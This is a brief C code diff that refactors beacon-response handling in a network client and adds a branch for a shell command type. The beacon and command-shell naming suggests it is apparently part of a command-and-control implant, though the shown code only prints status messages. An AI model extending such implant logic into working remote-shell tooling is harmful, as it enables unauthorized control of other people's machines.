@@ -100,15 +100,14 @@ bool net_client(char *host, int port){
         break;
       } else{
         if (p_net_server_beacon->status == true){
-          switch(p_net_server_beacon->command){
-          case NET_SERVER_CMD_BEACON:
+          if (p_net_server_beacon->command == NET_SERVER_CMD_BEACON){
             printf("[+] %s:%d OK\n",
                    inet_ntoa(server.sin_addr),
                    ntohs(server.sin_port));
-            break;
-          default:
+          } else if (p_net_server_beacon->command == NET_SERVER_CMD_SHELL){
+            printf("[+] cmd shell beacon\n");
+          } else {
             printf("[-] response data corrupt or command not supported\n");
-            break;
           }
         } else{
           fprintf(stderr, "[-] beacon status failed\n");
